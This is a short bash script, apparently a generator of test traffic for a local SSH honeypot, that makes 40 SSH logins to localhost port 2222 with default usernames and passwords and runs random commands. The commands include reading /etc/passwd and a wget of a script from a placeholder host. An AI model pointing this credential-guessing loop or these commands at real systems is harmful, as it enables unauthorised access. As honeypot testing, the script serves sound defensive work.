#!/usr/bin/env bash
HOST=127.0.0.1
PORT=2222
USERS=(root admin ubuntu test pi oracle postgres user guest ftpuser)
PASSES=(123456 admin password 12345 toor qwerty root letmein ubnt raspberry)
CMDS=("whoami" "id" "uname -a" "cat /etc/passwd" "ls -la" "pwd" "ps aux" "ifconfig" "cat /proc/cpuinfo" "wget http://example.com/x.sh" "curl http://example.com" "history")

for i in $(seq 1 40); do
  u=${USERS[RANDOM % ${#USERS[@]}]}
  p=${PASSES[RANDOM % ${#PASSES[@]}]}
  c1=${CMDS[RANDOM % ${#CMDS[@]}]}
  c2=${CMDS[RANDOM % ${#CMDS[@]}]}
  sshpass -p "$p" ssh -p $PORT -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=5 "$u@$HOST" "$c1; $c2; exit" >/dev/null 2>&1
  sleep $((RANDOM % 3))
done
echo "Done."
